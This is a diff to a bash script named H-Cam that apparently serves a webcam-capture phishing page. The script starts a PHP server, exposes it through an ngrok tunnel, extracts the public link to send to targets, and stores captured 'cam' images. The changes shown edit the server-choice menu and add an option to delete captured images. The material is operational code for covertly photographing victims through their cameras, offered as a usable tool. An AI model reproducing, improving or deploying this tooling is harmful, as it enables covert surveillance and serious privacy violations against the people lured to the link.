@@ -192,10 +192,11 @@ php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 cd ~/H-Cam
 chmod 777 ngrok
 ./ngrok http 3333 > /dev/null 2>&1 &
-sleep 7
 echo -e "\033[0m"
+sleep 8
 random
 printf " [>] Starting ngrok server...\n\n"
+echo -e "\033[0m"
 sleep 7
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 #printf "\e[1;92m[\e[0m*\e[1;92m] Your ngrok link:\e[0m\e[1;77m %s\e[0m\n" $link
@@ -235,10 +236,11 @@ rm -rf sendlink
 fi
 
 printf "\n"
-printf "\033[91m			[\033[97m1\033[91m] \033[92mServeo\n"
+printf "\033[91m			[\033[97m1\033[91m] \033[92mServeo (\033[91m Not Working\033[92m)\n"
 printf "\033[91m			[\033[97m2\033[91m] \033[92mNgrok\n"
+printf "\033[91m			[\033[97m3\033[91m] \033[92mDelete images\n\n"
 default_option_server="2"
-read -p $'\n\e[93m ##> \e[0m' option_server
+read -p $'\n\e[93m#> H-Cam :- \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
@@ -247,6 +249,9 @@ start
 
 elif [[ $option_server -eq 2 ]]; then
 ngrok_server
+
+elif [[ $option_server -eq 3 ]]; then
+del
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
@@ -255,6 +260,10 @@ start1
 fi
 
 }
+del () {
+	folder
+	rm -f cam* > /dev/null 2>&1
+	}
 
 
 payload() {
